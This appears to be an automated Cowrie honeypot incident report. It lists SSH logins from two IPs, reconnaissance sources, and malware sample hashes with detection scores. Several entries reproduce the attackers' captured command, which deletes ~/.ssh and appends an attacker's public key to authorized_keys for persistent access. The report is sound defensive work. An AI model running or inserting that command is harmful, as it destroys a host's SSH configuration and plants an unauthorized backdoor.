| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 18:51:09` | `cowrie.session.connect` |
| `2026-05-05 18:51:09` | `cowrie.client.version` |
| `2026-05-05 18:51:10` | `cowrie.client.kex` |
| `2026-05-05 18:51:12` | `cowrie.login.success` |
| `2026-05-05 18:51:13` | `cowrie.session.params` |
| `2026-05-05 18:51:13` | `cowrie.command.input` |
| `2026-05-05 18:51:13` | `cowrie.command.failed` |
| `2026-05-05 18:51:13` | `cowrie.log.closed` |
| `2026-05-05 18:51:14` | `cowrie.session.params` |
| `2026-05-05 18:51:14` | `cowrie.command.input` |
| `2026-05-05 18:51:15` | `cowrie.session.file_download` |
| `2026-05-05 18:51:15` | `cowrie.log.closed` |
| `2026-05-05 18:51:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.92.182[.]129` to AbuseIPDB if not already reported
- [ ] Block `185.92.182[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f551a31eb1a4

| Field | Detail |
|---|---|
| **Source IP** | `185.92.182[.]129` |
| **First Seen** | 2026-05-05 18:51 |
| **Last Seen** | 2026-05-05 18:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 18:51:20` | `cowrie.session.connect` |
| `2026-05-05 18:51:20` | `cowrie.client.version` |
| `2026-05-05 18:51:20` | `cowrie.client.kex` |
| `2026-05-05 18:51:22` | `cowrie.login.success` |
| `2026-05-05 18:51:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.92.182[.]129` to AbuseIPDB if not already reported
- [ ] Block `185.92.182[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a563344ca3f4

| Field | Detail |
|---|---|
| **Source IP** | `185.92.182[.]129` |
| **First Seen** | 2026-05-05 18:55 |
| **Last Seen** | 2026-05-05 18:55 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 18:55:20` | `cowrie.session.connect` |
| `2026-05-05 18:55:20` | `cowrie.client.version` |
| `2026-05-05 18:55:20` | `cowrie.client.kex` |
| `2026-05-05 18:55:22` | `cowrie.login.success` |
| `2026-05-05 18:55:24` | `cowrie.session.params` |
| `2026-05-05 18:55:24` | `cowrie.command.input` |
| `2026-05-05 18:55:24` | `cowrie.command.failed` |
| `2026-05-05 18:55:24` | `cowrie.log.closed` |
| `2026-05-05 18:55:25` | `cowrie.session.params` |
| `2026-05-05 18:55:25` | `cowrie.command.input` |
| `2026-05-05 18:55:25` | `cowrie.session.file_download` |
| `2026-05-05 18:55:25` | `cowrie.log.closed` |
| `2026-05-05 18:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.92.182[.]129` to AbuseIPDB if not already reported
- [ ] Block `185.92.182[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b449a3b6dd49

| Field | Detail |
|---|---|
| **Source IP** | `185.92.182[.]129` |
| **First Seen** | 2026-05-05 18:55 |
| **Last Seen** | 2026-05-05 18:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 18:55:30` | `cowrie.session.connect` |
| `2026-05-05 18:55:30` | `cowrie.client.version` |
| `2026-05-05 18:55:31` | `cowrie.client.kex` |
| `2026-05-05 18:55:33` | `cowrie.login.success` |
| `2026-05-05 18:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.92.182[.]129` to AbuseIPDB if not already reported
- [ ] Block `185.92.182[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ac1dcb516c3

| Field | Detail |
|---|---|
| **Source IP** | `68.183.236[.]1` |
| **First Seen** | 2026-05-05 18:59 |
| **Last Seen** | 2026-05-05 18:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 18:59:28` | `cowrie.session.connect` |
| `2026-05-05 18:59:28` | `cowrie.client.version` |
| `2026-05-05 18:59:28` | `cowrie.client.kex` |
| `2026-05-05 18:59:28` | `cowrie.login.success` |
| `2026-05-05 18:59:28` | `cowrie.session.params` |
| `2026-05-05 18:59:28` | `cowrie.command.input` |
| `2026-05-05 18:59:28` | `cowrie.command.failed` |
| `2026-05-05 18:59:28` | `cowrie.log.closed` |
| `2026-05-05 18:59:28` | `cowrie.session.params` |
| `2026-05-05 18:59:28` | `cowrie.command.input` |
| `2026-05-05 18:59:28` | `cowrie.session.file_download` |
| `2026-05-05 18:59:28` | `cowrie.log.closed` |
| `2026-05-05 18:59:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.236[.]1` to AbuseIPDB if not already reported
- [ ] Block `68.183.236[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3fe63968897

| Field | Detail |
|---|---|
| **Source IP** | `68.183.236[.]1` |
| **First Seen** | 2026-05-05 18:59 |
| **Last Seen** | 2026-05-05 18:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 18:59:30` | `cowrie.session.connect` |
| `2026-05-05 18:59:30` | `cowrie.client.version` |
| `2026-05-05 18:59:30` | `cowrie.client.kex` |
| `2026-05-05 18:59:30` | `cowrie.login.success` |
| `2026-05-05 18:59:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.236[.]1` to AbuseIPDB if not already reported
- [ ] Block `68.183.236[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45906e930213

| Field | Detail |
|---|---|
| **Source IP** | `68.183.236[.]1` |
| **First Seen** | 2026-05-05 19:00 |
| **Last Seen** | 2026-05-05 19:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 19:00:23` | `cowrie.session.connect` |
| `2026-05-05 19:00:23` | `cowrie.client.version` |
| `2026-05-05 19:00:23` | `cowrie.client.kex` |
| `2026-05-05 19:00:23` | `cowrie.login.success` |
| `2026-05-05 19:00:23` | `cowrie.session.params` |
| `2026-05-05 19:00:23` | `cowrie.command.input` |
| `2026-05-05 19:00:23` | `cowrie.command.failed` |
| `2026-05-05 19:00:23` | `cowrie.log.closed` |
| `2026-05-05 19:00:23` | `cowrie.session.params` |
| `2026-05-05 19:00:23` | `cowrie.command.input` |
| `2026-05-05 19:00:23` | `cowrie.session.file_download` |
| `2026-05-05 19:00:23` | `cowrie.log.closed` |
| `2026-05-05 19:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.236[.]1` to AbuseIPDB if not already reported
- [ ] Block `68.183.236[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01df197b8532

| Field | Detail |
|---|---|
| **Source IP** | `68.183.236[.]1` |
| **First Seen** | 2026-05-05 19:00 |
| **Last Seen** | 2026-05-05 19:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 19:00:25` | `cowrie.session.connect` |
| `2026-05-05 19:00:25` | `cowrie.client.version` |
| `2026-05-05 19:00:25` | `cowrie.client.kex` |
| `2026-05-05 19:00:25` | `cowrie.login.success` |
| `2026-05-05 19:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.236[.]1` to AbuseIPDB if not already reported
- [ ] Block `68.183.236[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f13531cd51c

| Field | Detail |
|---|---|
| **Source IP** | `185.92.182[.]129` |
| **First Seen** | 2026-05-05 19:01 |
| **Last Seen** | 2026-05-05 19:01 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 19:01:25` | `cowrie.session.connect` |
| `2026-05-05 19:01:25` | `cowrie.client.version` |
| `2026-05-05 19:01:25` | `cowrie.client.kex` |
| `2026-05-05 19:01:27` | `cowrie.login.success` |
| `2026-05-05 19:01:29` | `cowrie.session.params` |
| `2026-05-05 19:01:29` | `cowrie.command.input` |
| `2026-05-05 19:01:29` | `cowrie.command.failed` |
| `2026-05-05 19:01:29` | `cowrie.log.closed` |
| `2026-05-05 19:01:30` | `cowrie.session.params` |
| `2026-05-05 19:01:30` | `cowrie.command.input` |
| `2026-05-05 19:01:32` | `cowrie.session.file_download` |
| `2026-05-05 19:01:32` | `cowrie.log.closed` |
| `2026-05-05 19:01:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.92.182[.]129` to AbuseIPDB if not already reported
- [ ] Block `185.92.182[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2ffd9072cc4

| Field | Detail |
|---|---|
| **Source IP** | `185.92.182[.]129` |
| **First Seen** | 2026-05-05 19:01 |
| **Last Seen** | 2026-05-05 19:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 19:01:37` | `cowrie.session.connect` |
| `2026-05-05 19:01:37` | `cowrie.client.version` |
| `2026-05-05 19:01:38` | `cowrie.client.kex` |
| `2026-05-05 19:01:40` | `cowrie.login.success` |
| `2026-05-05 19:01:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.92.182[.]129` to AbuseIPDB if not already reported
- [ ] Block `185.92.182[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4bbb78201ba

| Field | Detail |
|---|---|
| **Source IP** | `185.92.182[.]129` |
| **First Seen** | 2026-05-05 19:03 |
| **Last Seen** | 2026-05-05 19:03 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 19:03:27` | `cowrie.session.connect` |
| `2026-05-05 19:03:27` | `cowrie.client.version` |
| `2026-05-05 19:03:27` | `cowrie.client.kex` |
| `2026-05-05 19:03:30` | `cowrie.login.success` |
| `2026-05-05 19:03:31` | `cowrie.session.params` |
| `2026-05-05 19:03:31` | `cowrie.command.input` |
| `2026-05-05 19:03:31` | `cowrie.command.failed` |
| `2026-05-05 19:03:32` | `cowrie.log.closed` |
| `2026-05-05 19:03:33` | `cowrie.session.params` |
| `2026-05-05 19:03:33` | `cowrie.command.input` |
| `2026-05-05 19:03:34` | `cowrie.session.file_download` |
| `2026-05-05 19:03:34` | `cowrie.log.closed` |
| `2026-05-05 19:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.92.182[.]129` to AbuseIPDB if not already reported
- [ ] Block `185.92.182[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87d3bcc50e7f

| Field | Detail |
|---|---|
| **Source IP** | `185.92.182[.]129` |
| **First Seen** | 2026-05-05 19:03 |
| **Last Seen** | 2026-05-05 19:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 19:03:39` | `cowrie.session.connect` |
| `2026-05-05 19:03:39` | `cowrie.client.version` |
| `2026-05-05 19:03:40` | `cowrie.client.kex` |
| `2026-05-05 19:03:42` | `cowrie.login.success` |
| `2026-05-05 19:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.92.182[.]129` to AbuseIPDB if not already reported
- [ ] Block `185.92.182[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c136c43c0fc

| Field | Detail |
|---|---|
| **Source IP** | `68.183.236[.]1` |
| **First Seen** | 2026-05-05 19:10 |
| **Last Seen** | 2026-05-05 19:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 19:10:52` | `cowrie.session.connect` |
| `2026-05-05 19:10:52` | `cowrie.client.version` |
| `2026-05-05 19:10:52` | `cowrie.client.kex` |
| `2026-05-05 19:10:52` | `cowrie.login.success` |
| `2026-05-05 19:10:52` | `cowrie.session.params` |
| `2026-05-05 19:10:52` | `cowrie.command.input` |
| `2026-05-05 19:10:52` | `cowrie.command.failed` |
| `2026-05-05 19:10:53` | `cowrie.log.closed` |
| `2026-05-05 19:10:53` | `cowrie.session.params` |
| `2026-05-05 19:10:53` | `cowrie.command.input` |
| `2026-05-05 19:10:53` | `cowrie.session.file_download` |
| `2026-05-05 19:10:53` | `cowrie.log.closed` |
| `2026-05-05 19:10:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.236[.]1` to AbuseIPDB if not already reported
- [ ] Block `68.183.236[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee0e03dc9150

| Field | Detail |
|---|---|
| **Source IP** | `68.183.236[.]1` |
| **First Seen** | 2026-05-05 19:10 |
| **Last Seen** | 2026-05-05 19:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 19:10:54` | `cowrie.session.connect` |
| `2026-05-05 19:10:54` | `cowrie.client.version` |
| `2026-05-05 19:10:54` | `cowrie.client.kex` |
| `2026-05-05 19:10:55` | `cowrie.login.success` |
| `2026-05-05 19:10:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.236[.]1` to AbuseIPDB if not already reported
- [ ] Block `68.183.236[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `171.15.55[.]150` | **31** | 2026-05-05 18:30 | 2026-05-05 18:45 | 52m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `117.50.70[.]125` | **30** | 2026-05-05 18:36 | 2026-05-05 19:09 | 49m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.196.236[.]141` | **30** | 2026-05-05 17:33 | 2026-05-05 18:35 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `68.183.236[.]1` | **30** | 2026-05-05 18:20 | 2026-05-05 19:20 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `185.92.182[.]129` | **29** | 2026-05-05 18:38 | 2026-05-05 19:07 | 1m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `72.255.3[.]2` | **25** | 2026-05-05 18:01 | 2026-05-05 18:07 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `14.103.113[.]42` | **11** | 2026-05-05 17:35 | 2026-05-05 18:14 | 16m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `40.81.244[.]142` | **3** | 2026-05-05 17:28 | 2026-05-05 17:30 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.64[.]76` | 1 | 2026-05-05 18:40 | 2026-05-05 18:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.32.1[.]25` | 1 | 2026-05-05 18:39 | 2026-05-05 18:39 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.12.74[.]119` | 1 | 2026-05-05 18:21 | 2026-05-05 18:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.225.131[.]252` | 1 | 2026-05-05 17:33 | 2026-05-05 17:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.141.171[.]139` | 1 | 2026-05-05 18:38 | 2026-05-05 18:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.237[.]236` | 1 | 2026-05-05 18:30 | 2026-05-05 18:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.241.117[.]94` | 1 | 2026-05-05 18:56 | 2026-05-05 18:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.123[.]76` | 1 | 2026-05-05 17:33 | 2026-05-05 17:35 | 76s | 0 | `T1592` | 🟢 LOW |
| `120.48.130[.]213` | 1 | 2026-05-05 18:31 | 2026-05-05 18:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.147[.]81` | 1 | 2026-05-05 18:44 | 2026-05-05 18:45 | 20s | 0 | `T1592` | 🟢 LOW |
| `14.18.113[.]233` | 1 | 2026-05-05 18:31 | 2026-05-05 18:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `162.221.222[.]179` | 1 | 2026-05-05 18:31 | 2026-05-05 18:32 | 30s | 0 | `T1592` | 🟢 LOW |
| `180.153.91[.]15` | 1 | 2026-05-05 18:21 | 2026-05-05 18:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.64.85[.]138` | 1 | 2026-05-05 18:21 | 2026-05-05 18:23 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (26 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 40/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
